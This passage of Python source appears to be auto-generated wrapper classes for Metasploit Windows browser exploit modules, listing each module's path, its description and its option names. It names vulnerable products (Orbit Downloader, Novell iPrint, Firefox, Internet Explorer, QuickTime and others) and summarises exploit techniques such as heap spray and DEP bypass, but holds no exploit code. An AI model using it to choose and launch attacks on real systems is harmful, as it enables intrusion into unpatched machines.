          This module exploits a stack buffer overflow in Orbit Downloader 2.8.4. When an
        attacker serves up a malicious web site, abritrary code may be executed.
        The PAYLOAD windows/shell_bind_tcp works best.
      
		"""

		path = 'windows/browser/orbit_connecting'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_lpviewer_url(object):
		"""
		
          This module exploits a stack buffer overflow in LPViewer ActiveX control (LPControll.dll 3.2.0.2). When
        sending an overly long string to the URL() property an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/lpviewer_url'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_novelliprint_executerequest_dbg(object):
		"""
		
          This module exploits a stack-based buffer overflow in Novell iPrint Client 5.40.
        When sending an overly long string to the 'debug' parameter in ExecuteRequest()
        property of ienipp.ocx an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/novelliprint_executerequest_dbg'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_advantech_webaccess_dvs_getcolor(object):
		"""
		
        This module exploits a buffer overflow vulnerability in Advantec WebAccess. The
        vulnerability exists in the dvs.ocx ActiveX control, where a dangerous call to
        sprintf can be reached with user controlled data through the GetColor function.
        This module has been tested successfully on Windows XP SP3 with IE6 and Windows
        7 SP1 with IE8 and IE 9.
      
		"""

		path = 'windows/browser/advantech_webaccess_dvs_getcolor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_mozilla_firefox_xmlserializer(object):
		"""
		
        This module exploits a vulnerability found on Firefox 17.0 (< 17.0.2), specifically
        a use-after-free of an Element object, when using the serializeToStream method
        with a specially crafted OutputStream defining its own write function. This module
        has been tested successfully with Firefox 17.0.1 ESR, 17.0.1 and 17.0 on Windows XP
        SP3.
      
		"""

		path = 'windows/browser/mozilla_firefox_xmlserializer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_enjoysapgui_comp_download(object):
		"""
		
          This module allows remote attackers to place arbitrary files on a users file system
        by abusing the "Comp_Download" method in the SAP KWEdit ActiveX Control (kwedit.dll 6400.1.1.41).
      
		"""

		path = 'windows/browser/enjoysapgui_comp_download'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_browser_mozilla_interleaved_write(object):
		"""
		
          This module exploits a code execution vulnerability in Mozilla
        Firefox caused by interleaved calls to document.write and appendChild.
        This module was written based on a live exploit found in the wild.
      
		"""

		path = 'windows/browser/mozilla_interleaved_write'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ms08_078_xml_corruption(object):
		"""
		
        This module exploits a vulnerability in the data binding feature of Internet
      Explorer. In order to execute code reliably, this module uses the .NET DLL
      memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is
      used to create a fake vtable at a known location with all methods pointing
      to our payload. Since the .text segment of the .NET DLL is non-writable, a
      prefixed code stub is used to copy the payload into a new memory segment and
      continue execution from there.
      
		"""

		path = 'windows/browser/ms08_078_xml_corruption'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_flashplayer_newfunction(object):
		"""
		
          This module exploits a vulnerability in the DoABC tag handling within
        versions 9.x and 10.0 of Adobe Flash Player. Adobe Reader and Acrobat are also
        vulnerable, as are any other applications that may embed Flash player.

        Arbitrary code execution is achieved by embedding a specially crafted Flash
        movie into a PDF document. An AcroJS heap spray is used in order to ensure
        that the memory used by the invalid pointer issue is controlled.

        NOTE: This module uses a similar DEP bypass method to that used within the
        adobe_libtiff module. This method is unlikely to work across various
        Windows versions due a the hardcoded syscall number.
      
		"""

		path = 'windows/browser/adobe_flashplayer_newfunction'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms14_012_cmarkup_uaf(object):
		"""
		
        This module exploits an use after free condition on Internet Explorer as used in the wild
        as part of "Operation SnowMan" in February 2014. The module uses Flash Player 12 in order to
        bypass ASLR and DEP.
      
		"""

		path = 'windows/browser/ms14_012_cmarkup_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_synactis_connecttosynactis_bof(object):
		"""
		
          This module exploits a vulnerability found in Synactis' PDF In-The-Box ActiveX
        component, specifically PDF_IN_1.ocx.  When a long string of data is given
        to the ConnectToSynactis function, which is meant to be used for the ldCmdLine
        argument of a WinExec call, a strcpy routine can end up overwriting a TRegistry
        class pointer saved on the stack, resulting in arbitrary code execution under the
        context of the user.

          Also note that since the WinExec function is used to call the default browser,
        you must be aware that: 1) The default must be Internet Explorer, and 2) when the
        exploit runs, another browser will pop up.

          Synactis PDF In-The-Box is also used by other software such as Logic Print 2013,
        which is how the vulnerability was found and publicly disclosed.
      
		"""

		path = 'windows/browser/synactis_connecttosynactis_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms10_046_shortcut_icon_dllloader(object):
		"""
		
          This module exploits a vulnerability in the handling of Windows
        Shortcut files (.LNK) that contain an icon resource pointing to a
        malicious DLL. This module creates a WebDAV service that can be used
        to run an arbitrary payload when accessed as a UNC path.
      
		"""

		path = 'windows/browser/ms10_046_shortcut_icon_dllloader'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			UNCHOST = 'UNCHOST'

	class windows_browser_adobe_flash_casi32_int_overflow(object):
		"""
		
        This module exploits an integer overflow in Adobe Flash Player. The vulnerability occurs in
        the casi32 method, where an integer overflow occurs if a ByteArray of length 0 is setup as
        domainMemory for the current application domain. This module has been tested successfully
        on Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 15.0.0.167.
      
		"""

		path = 'windows/browser/adobe_flash_casi32_int_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_communicrypt_mail_activex(object):
		"""
		
          This module exploits a stack buffer overflow in the ANSMTP.dll/AOSMTP.dll
        ActiveX Control provided by CommuniCrypt Mail 1.16.  By sending a overly
        long string to the "AddAttachments()" method, an attacker may be able to
        execute arbitrary code.
      
		"""

		path = 'windows/browser/communicrypt_mail_activex'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_oracle_dc_submittoexpress(object):
		"""
		
          This module exploits a stack buffer overflow in Oracle Document Capture 10g (10.1.3.5.0).
        Oracle Document Capture 10g comes bundled with a third party ActiveX control
        emsmtp.dll (6.0.1.0). When passing a overly long string to the method "SubmitToExpress"
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/oracle_dc_submittoexpress'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ie_iscomponentinstalled(object):
		"""
		
          This module exploits a stack buffer overflow in Internet Explorer. This bug was
        patched in Windows 2000 SP4 and Windows XP SP1 according to MSRC.
      
		"""

		path = 'windows/browser/ie_iscomponentinstalled'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			DynamicSehRecord = 'DynamicSehRecord'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms10_090_ie_css_clip(object):
		"""
		
          Thie module exploits a memory corruption vulnerability within Microsoft's
        HTML engine (mshtml). When parsing an HTML page containing a specially
        crafted CSS tag, memory corruption occurs that can lead arbitrary code
        execution.

        It seems like Microsoft code inadvertantly increments a vtable pointer to
        point to an unaligned address within the vtable's function pointers. This
        leads to the program counter being set to the address determined by the
        address "[vtable+0x30+1]". The particular address depends on the exact
        version of the mshtml library in use.

        Since the address depends on the version of mshtml, some versions may not
        be exploitable. Specifically, those ending up with a program counter value
        within another module, in kernel space, or just not able to be reached with
        various memory spraying techniques.

        Also, since the address is not controllable, it is unlikely to be possible
        to use ROP to bypass non-executable memory protections.
      
		"""

		path = 'windows/browser/ms10_090_ie_css_clip'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_apple_quicktime_rtsp(object):
		"""
		
          This module exploits a buffer overflow in Apple QuickTime
        7.1.3. This module was inspired by MOAB-01-01-2007.  The
        Browser target for this module was tested against IE 6 and
        Firefox 1.5.0.3 on Windows XP SP0/2; Firefox 3 blacklists the
        QuickTime plugin.
      
		"""

		path = 'windows/browser/apple_quicktime_rtsp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_apple_quicktime_mime_type(object):
		"""
		
          This module exploits a buffer overflow in Apple QuickTime 7.7.2. The stack
        based overflow occurs when processing a malformed Content-Type header. The module
        has been tested successfully on Safari 5.1.7 and 5.0.7 on Windows XP SP3.
      
		"""

		path = 'windows/browser/apple_quicktime_mime_type'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_novelliprint_getdriversettings_2(object):
		"""
		
          This module exploits a stack buffer overflow in Novell iPrint Client 5.52. When
        sending an overly long string to the GetDriverSettings() property of ienipp.ocx
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/novelliprint_getdriversettings_2'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

